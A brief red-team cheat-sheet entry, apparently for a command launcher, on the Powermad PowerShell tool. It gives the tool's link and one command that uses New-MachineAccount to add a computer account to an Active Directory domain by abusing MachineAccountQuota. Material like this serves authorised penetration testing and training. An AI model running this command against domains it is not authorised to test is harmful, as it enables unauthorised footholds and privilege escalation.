# powermad

% windows, Active directory
#plateform/windows #target/remote  #cat/ATTACK

## powermad - url
```
https://github.com/Kevin-Robertson/Powermad/
```

## powermad - desc
```
PowerShell MachineAccountQuota and DNS exploit tools
```

## Add computer
```powershell
$password = ConvertTo-SecureString '<password|Jubeaz12345+->' -AsPlainText -Force; New-MachineAccount -MachineAccount "<computer_name|jubeaz>" -Password $($password) -Domain <domain_fqdn> -DomainController <dc_ip> -Verbose
```

